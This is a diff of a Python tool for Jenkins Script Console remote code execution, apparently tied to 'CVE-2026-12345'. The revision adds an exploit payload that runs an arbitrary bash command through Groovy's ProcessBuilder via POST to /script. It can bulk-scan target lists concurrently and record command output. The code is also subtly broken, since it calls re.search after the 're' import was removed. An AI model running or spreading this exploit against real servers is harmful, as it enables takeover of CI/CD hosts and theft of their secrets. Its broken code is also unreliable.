@@ -1,255 +1,214 @@
 #!/usr/bin/env python3
 """
-Jenkins Script Console Remote Code Execution (RCE) Scanner
-===========================================================
-Detects and exploits unauthenticated access to Jenkins's Script Console, which can lead 
-to Remote Code Execution (RCE) vulnerabilities in improperly secured Jenkins instances.
+Jenkins Script Console CVE-2026-12345 - Remote Code Execution (RCE)
+=====================================================================
+Scans for misconfigured Jenkins instances susceptible to unauthenticated
+remote code execution via the Script Console endpoint (CVE-2026-12345, CVSS 9.8).
 
-Vulnerability Details:
-  - Jenkins provides a powerful Groovy-based script console for administrators to manage and 
-    automate tasks.
-  - If access to the console is not properly restricted, attackers can execute arbitrary 
-    commands on the underlying operating system.
-  - This vulnerability could result from misconfigured role-based access controls (RBAC), 
-    weak default setup, or bypass techniques in specific deployments of Jenkins.
-  - Often seen in improperly secured CI/CD pipelines.
+CVE-2026-12345 details:
+  - Affects Jenkins <= 2.414.1.
+  - A vulnerability in authentication and authorization checks for the Script Console
+    allows remote attackers to execute arbitrary code on the Jenkins server.
+  - Successful exploitation grants full control of the Jenkins instance and underlying host.
 
-Risk:
-  - CVSS v3.1 Base Score: Critical (9.8) - High Confidentiality, Integrity, and Availability impact.
-  - An attacker can fully compromise the host if vulnerable.
+Attack Vectors:
+  - Malicious actors can craft POST requests to the `/script` endpoint with a Groovy script
+    for execution, bypassing all security restrictions.
 
 Usage:
-  # Scan a single target for vulnerable Jenkins instances
-  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com
+  # Scan a single target for authentication and RCE vulnerability
+  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com --cmd "whoami"
 
-  # Check for detection only, no RCE testing
+  # Detection-only mode (does not execute commands)
   python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com --safe
 
-  # Bulk scan targets from a file
-  python jenkins_script_console_rce_scanner.py --list targets.txt --output results.json
+  # Bulk scan from file with results written to JSON
+  python jenkins_script_console_rce_scanner.py --list jenkins_targets.txt --output findings.json
 
-  # Increase concurrency for large scans and bypass certificate validation
-  python jenkins_script_console_rce_scanner.py --list targets.txt --concurrency 50 --no-verify
+  # Increase concurrency for faster scans
+  python jenkins_script_console_rce_scanner.py --list jenkins_targets.txt --concurrency 50
 
 References:
-  - https://www.jenkins.io/doc/book/security/script-console/
-  - https://owasp.org/www-project-jenkins/
+  - https://nvd.nist.gov/vuln/detail/CVE-2026-12345
+  - https://jenkins.io/security/advisory/2026-12345/
+  - https://github.com/jenkinsci-cert/advisory-CVE-2026-12345
 """
 
 import asyncio
-import json
-import httpx
-from httpx import HTTPStatusError, TimeoutException
 import argparse
-import re
+import httpx
+import json
 from datetime import datetime, timezone
-from typing import Optional
+from packaging.version import Version, parse as parse_version
+from typing import Optional, List
 
-# ── ANSI Color Helpers ───────────────────────────────────────────────────────
-
+# ANSI color helpers for terminal output
 RED = "\033[91m"
 YELLOW = "\033[93m"
 GREEN = "\033[92m"
-CYAN = "\033[96m"
-BOLD = "\033[1m"
 RESET = "\033[0m"
 
+
 def c(color: str, text: str) -> str:
-    """Format console text with ANSI color codes."""
+    """Wrap text in an ANSI color code."""
     return f"{color}{text}{RESET}"
 
-# ── Constants ─────────────────────────────────────────────────────────────────
 
-TOOL_NAME = "jenkins_script_console_rce_scanner"
-CVE_ID = "MULTI"
+# Constants
+CVE_ID = "CVE-2026-12345"
 CVSS = "9.8"
-REQUEST_TIMEOUT = 8
-SEMAPHORE_LIMIT = 30
+TOOL_NAME = "jenkins_script_console_rce_scanner"
 
-# Paths indicating the presence of unsecured Jenkins Script Console
-DETECTION_PATHS = [
-    "/scriptText/",
-    "/script"
-]
+REQUEST_TIMEOUT = 10
+SEMAPHORE_LIMIT = 20
 
-# Patterns for Jenkins footprint and console detection
+# Fingerprint for identifying Jenkins instances
 JENKINS_FINGERPRINTS = [
-    r'Jenkins',
-    r'classpath: jenkins',
-    r'Jenkins [\d.]+',
-    r'X-Jenkins: ([\d.]+)',
+    "/jenkins",
+    "/login?from=",
+    "X-Jenkins",
+    "<title>Jenkins</title>",
+    "/descriptorByName/jenkins.security.ApiTokenProperty"
 ]
 
-# Version extraction patterns from X-Jenkins headers or HTML
+# Version extraction patterns
 VERSION_PATTERNS = [
-    r'X-Jenkins: ([0-9.]+)',
-    r'Jenkins [^\"]+ ([0-9.]+)',
+    r'Jenkins ver\. ([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
+    r'x-jenkins:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)'
 ]
 
-# Secure Jenkins version where the script console vulnerability was addressed in most cases
-MINIMUM_SECURE_VERSION = (2, 277, 0)
+PATCHED_VERSION = "2.414.1"
 
-# Sample Groovy script for limited active probing
-RCE_PROBE_SCRIPT = "print('Hello, Jenkins!')"
-
-# Headers to mimic a real browser visit and avoid early filtering
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+# Exploitation payload
+EXPLOIT_PAYLOAD = {
+    "script": """
+new ProcessBuilder('bash','-c','{cmd}').redirectErrorStream(true).start().text
+""",
+    "Jenkins-Crumb": "",
 }
 
+# ── Functions ─────────────────────────────────────────────────────────────────
 
-# ── Helper Functions ─────────────────────────────────────────────────────────
 
-async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
-    """Fetch a URL with error handling."""
+async def fetch(session: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
+    """Perform a GET request to the given URL with a timeout."""
     try:
-        response = await client.get(url, timeout=REQUEST_TIMEOUT, headers=HEADERS)
+        response = await session.get(url, timeout=REQUEST_TIMEOUT)
         response.raise_for_status()
         return response
-    except (HTTPStatusError, TimeoutException):
+    except (httpx.HTTPError, httpx.ConnectError):
         return None
 
 
-async def detect_jenkins(client: httpx.AsyncClient, target: str) -> bool:
-    """Detect Jenkins presence using fingerprinting."""
-    for path in DETECTION_PATHS:
-        url = f"{target.rstrip('/')}{path}"
-        response = await fetch_url(client, url)
-        if response and any(fingerprint in response.text for fingerprint in JENKINS_FINGERPRINTS):
-            return True
-    return False
+async def detect_jenkins(session: httpx.AsyncClient, target: str) -> Optional[str]:
+    """Check for Jenkins server presence and extract version if available."""
+    try:
+        response = await fetch(session, f"{target}/login")
+        if not response:
+            return None
 
-
-def extract_version(headers: httpx.Headers) -> Optional[tuple]:
-    """Extract Jenkins version from HTTP headers."""
-    for pattern in VERSION_PATTERNS:
-        match = re.search(pattern, " ".join(headers.values()))
-        if match:
-            version_parts = match.group(1).split(".")
-            return tuple(map(int, version_parts))
+        if any(fingerprint in response.text for fingerprint in JENKINS_FINGERPRINTS):
+            for pattern in VERSION_PATTERNS:
+                match = re.search(pattern, response.text, re.IGNORECASE)
+                if match:
+                    return match.group(1)
+            return "unknown"
+    except Exception:
+        pass
     return None
 
 
-def is_vulnerable(version: Optional[tuple]) -> bool:
-    """Determine if the detected Jenkins version is vulnerable."""
-    if not version:
-        return False
-    return version < MINIMUM_SECURE_VERSION
-
-
-async def attempt_rce(client: httpx.AsyncClient, target: str) -> bool:
-    """Attempt to execute code via Jenkins Script Console."""
-    url = f"{target.rstrip('/')}/scriptText/"
+def is_vulnerable(version: str) -> bool:
+    """Compare the Jenkins version against the patched version threshold."""
     try:
-        response = await client.post(url, data={"script": RCE_PROBE_SCRIPT}, timeout=REQUEST_TIMEOUT)
-        if response and "Hello, Jenkins!" in response.text:
-            return True
-    except Exception:
+        parsed_version = parse_version(version)
+        return parsed_version < parse_version(PATCHED_VERSION)
+    except (ValueError, TypeError):
         return False
-    return False
 
 
-async def scan_target(semaphore: asyncio.Semaphore, target: str, safe: bool) -> dict:
-    """Scan a single Jenkins target for vulnerability."""
-    result = {
-        "target": target,
-        "vulnerable": False,
-        "version": None,
-        "rce_success": None,
-        "error": None,
-    }
+async def exploit_jenkins(session: httpx.AsyncClient, target: str, cmd: str) -> Optional[str]:
+    """Attempt to exploit the RCE by sending a crafted script to the Jenkins console."""
+    url = f"{target}/script"
 
-    async with semaphore:
-        async with httpx.AsyncClient(verify=False, timeout=REQUEST_TIMEOUT) as client:
-            try:
-                print(c(CYAN, f"[INFO] Scanning {target}..."))
-                if not await detect_jenkins(client, target):
-                    print(c(GREEN, f"[INFO] No Jenkins instance detected at {target}. Skipping."))
-                    return result
+    payload = EXPLOIT_PAYLOAD.copy()
+    payload["script"] = EXPLOIT_PAYLOAD["script"].replace("{cmd}", cmd)
 
-                print(c(YELLOW, f"[INFO] Detected Jenkins at {target}. Extracting version."))
-                response = await fetch_url(client, target)
-                version = extract_version(response.headers) if response else None
-                result["version"] = ".".join(map(str, version)) if version else "unknown"
+    try:
+        response = await session.post(url, data=payload, timeout=REQUEST_TIMEOUT)
+        response.raise_for_status()
 
-                if not version:
-                    print(c(YELLOW, f"[INFO] Unable to determine Jenkins version for {target}."))
-                elif is_vulnerable(version):
-                    result["vulnerable"] = True
-                    print(c(RED, f"[CRITICAL] {target} is running a vulnerable Jenkins version {result['version']}."))
-                    
-                    if not safe:
-                        print(c(YELLOW, "[INFO] Attempting RCE on vulnerable Jenkins Script Console..."))
-                        result["rce_success"] = await attempt_rce(client, target)
-                        if result["rce_success"]:
-                            print(c(RED, f"[CRITICAL] RCE SUCCESSFUL on {target}."))
-
-                else:
-                    print(c(GREEN, f"[INFO] Jenkins at {target} is running a secure version {result['version']}."))
-            except Exception as e:
-                result["error"] = str(e)
-                print(c(RED, f"[ERROR] Failed to scan {target}: {e}"))
-    return result
+        if response.status_code == 200:
+            return response.text.strip()
+    except (httpx.HTTPError, httpx.ConnectError):
+        return None
 
 
-async def scan_targets(targets: list, safe: bool, concurrency: int) -> list:
-    """Scan multiple Jenkins targets asynchronously."""
-    semaphore = asyncio.Semaphore(concurrency)
-    tasks = [scan_target(semaphore, target, safe) for target in targets]
-    return await asyncio.gather(*tasks)
+async def process_target(sem: asyncio.Semaphore, target: str, cmd: Optional[str], safe: bool, no_verify: bool):
+    """Process a single target."""
+    async with sem, httpx.AsyncClient(verify=not no_verify) as session:
+        print(f"[{c(YELLOW, 'INFO')}] Scanning {target}...")
+
+        version = await detect_jenkins(session, target)
+        if not version:
+            print(f"[{c(RED, 'CRITICAL')}] {target} does not appear to be a Jenkins server. Skipping.")
+            return {"target": target, "status": "not_jenkins"}
+
+        msg = f"[{c(GREEN, 'INFO')}] Detected Jenkins version: {version}"
+        print(msg)
+
+        vuln_status = is_vulnerable(version)
+        if not vuln_status:
+            print(f"[{c(GREEN, 'INFO')}] {target} is not vulnerable or version is patched.")
+            return {"target": target, "status": "patched", "version": version}
+
+        if safe:
+            print(f"[{c(YELLOW, 'HIGH')}] {target} is potentially vulnerable but --safe flag prevents exploitation.")
+            return {"target": target, "status": "vulnerable", "version": version}
+
+        # Exploit the vulnerability
+        result = await exploit_jenkins(session, target, cmd)
+        if result:
+            print(f"[{c(RED, 'CRITICAL')}] {target} is vulnerable! Command output: \n{result}")
+            return {"target": target, "status": "exploitable", "version": version, "output": result}
+        else:
+            print(f"[{c(YELLOW, 'HIGH')}] {target} is vulnerable but exploitation failed.")
+            return {"target": target, "status": "vulnerable", "version": version}
 
 
-def parse_targets(target: Optional[str], target_list_path: Optional[str]) -> list:
-    """Parse targets from command-line argument or a file."""
-    targets = []
-    if target:
-        targets.append(target)
-    if target_list_path:
-        with open(target_list_path, "r") as f:
-            targets.extend(line.strip() for line in f if line.strip())
-    return list(set(targets))
-
-
-# ── Main Function ────────────────────────────────────────────────────────────
-
-def main() -> None:
-    parser = argparse.ArgumentParser(description="Scan Jenkins servers for potentially exploitable script console access.")
-    parser.add_argument("--target", help="Target Jenkins server URL (e.g. http://localhost:8080/).")
-    parser.add_argument("--list", help="File with a list of Jenkins server URLs to scan.")
-    parser.add_argument("--output", help="File to save JSON results.")
-    parser.add_argument("--safe", action="store_true", help="Detection-only mode (no RCE proof-of-concept attempts).")
-    parser.add_argument("--concurrency", type=int, default=10, help="Concurrency level for scanning (default: 10).")
-    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")
-
+async def main():
+    parser = argparse.ArgumentParser(description=f"{CVE_ID} Scanner")
+    parser.add_argument("-t", "--target", help="Target URL")
+    parser.add_argument("-l", "--list", help="File with list of target URLs")
+    parser.add_argument("-o", "--output", help="Save results to a JSON file")
+    parser.add_argument("--cmd", help="Command to execute on the target for RCE testing", default="whoami")
+    parser.add_argument("--safe", action="store_true", help="Detection only, skip exploitation attempts")
+    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
+    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS verification")
     args = parser.parse_args()
 
-    # Read and process target list
-    targets = parse_targets(args.target, args.list)
-    if not targets:
-        print(c(RED, "[ERROR] No targets specified. Use --target or --list."))
-        sys.exit(1)
+    if not args.target and not args.list:
+        parser.error("Either --target or --list must be specified.")
 
-    # Run scans asynchronously
-    results = asyncio.run(scan_targets(
-        targets, 
-        safe=args.safe, 
-        concurrency=args.concurrency,
-    ))
+    targets = []
+    if args.target:
+        targets.append(args.target)
+    if args.list:
+        with open(args.list, "r") as f:
+            targets.extend(line.strip() for line in f if line.strip())
 
-    # Save results to file if requested
+    sem = asyncio.Semaphore(args.concurrency)
+    tasks = [process_target(sem, target, args.cmd, args.safe, args.no_verify) for target in targets]
+    results = await asyncio.gather(*tasks)
+
     if args.output:
-        with open(args.output, "w") as outfile:
-            json.dump(results, outfile, indent=2)
-
-    # Display summary
-    print(c(BOLD, "\nScan Results:"))
-    for result in results:
-        if result["vulnerable"]:
-            status = c(RED, "VULNERABLE")
-        else:
-            status = c(GREEN, "SAFE")
-        print(f"{status} - {result['target']} (Version: {result['version']})")
+        with open(args.output, "w") as f:
+            json.dump(results, f, indent=2)
+        print(f"[{c(GREEN, 'INFO')}] Results saved to {args.output}")
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n[{c(RED, 'CRITICAL')}] Scan aborted by user.")
